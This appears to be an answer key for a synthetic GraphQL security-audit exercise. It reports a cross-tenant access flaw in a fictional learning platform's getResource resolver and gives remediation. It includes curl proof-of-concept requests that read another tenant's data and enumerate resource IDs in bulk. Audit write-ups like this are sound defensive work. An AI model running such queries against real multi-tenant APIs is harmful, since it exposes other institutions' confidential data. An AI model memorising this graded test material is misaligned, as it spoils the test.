# Expected Response

## System
- Domain: Education / EdTech LMS
- System: LearnPath Assessment Platform
- Example ID: GQL-0066

## Priority Findings

### Finding 1: Cross-Tenant Access to Draft/Non-Published Learning Resources (Pattern 10.5)
**Severity:** High
**Category:** BOLA / Single-User Vulnerability

**Summary:**
Per §5.0 (Pattern 10.5 — draft/non-published resource access): "The resolver handling `resourceId` does not enforce ownership or tenancy boundaries." An attacker from `tenant-3ab7` accessed learning resource `R-2066` (belonging to `tenant-5984`) which may be in draft/unpublished state. Without tenantId enforcement, students can access assessment content, exam answers, or draft course materials from other institutions before they are intended for release.

**Evidence from HAR:**
- Request: `POST https://api.learnpath-assessment.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-3ab7`
- Query: `getResource(id: "R-2066") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`; `tenantId: "tenant-5984"`, `ownerId: "other-user-3ab75984"`, `sensitiveField: "CONFIDENTIAL-3ab75984"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-3ab75984`

**Root Cause (§4.0 RISK-GQL-066):** `getResource` resolver fetches by `resourceId` only; no tenantId match.

## Steps to Reproduce

### Step 1 — Cross-tenant draft resource access (HAR)
```bash
curl -s -X POST https://api.learnpath-assessment.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-3ab7" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2066\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-3ab75984` from `tenant-5984`. **Secure:** FORBIDDEN.

### Step 2 — Bulk draft resource enumeration
```bash
curl -s -X POST https://api.learnpath-assessment.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-3ab7" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2066\", \"R-1066\", \"R-3066\"]) { resourceId tenantId data { sensitiveField } } }"}'
```

## Remediation
1. Resolver tenant guard on `getResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Status filter: only return resources with `status=published` for cross-tenant scenarios.
3. Per-ID ownership filter in `bulkResourceLookup`.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
